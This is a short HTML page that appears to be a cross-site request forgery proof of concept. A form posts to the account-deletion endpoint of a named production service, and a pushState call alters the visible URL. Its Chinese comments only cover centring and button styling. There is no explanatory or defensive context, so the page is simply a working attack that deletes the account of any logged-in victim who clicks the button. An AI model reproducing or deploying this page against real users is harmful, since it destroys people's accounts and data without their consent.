<html>
  <head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    
    <style>
      /* 移除默认边距，并让 html 和 body 占满整个屏幕高度 */
      html, body {
        margin: 0;
        padding: 0;
        height: 100%;
        /* 使用 Flexbox 布局 */
        display: flex;
        /* 水平居中 */
        justify-content: center;
        /* 垂直居中 */
        align-items: center;
        background-color: #fafafa; /* 可选：添加浅色背景以便观察 */
      }

      /* 可选：修饰一下按钮，使其更适合在手机上点击 */
      input[type="submit"] {
        padding: 12px 24px;
        font-size: 16px;
        cursor: pointer;
      }
    </style>
  </head>
  
  <body>
    <script>history.pushState('', '', '/')</script>
    <form action="https://feed-prod-id-01.cachup.ai/api/v1/auth/delete-account" method="POST">
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
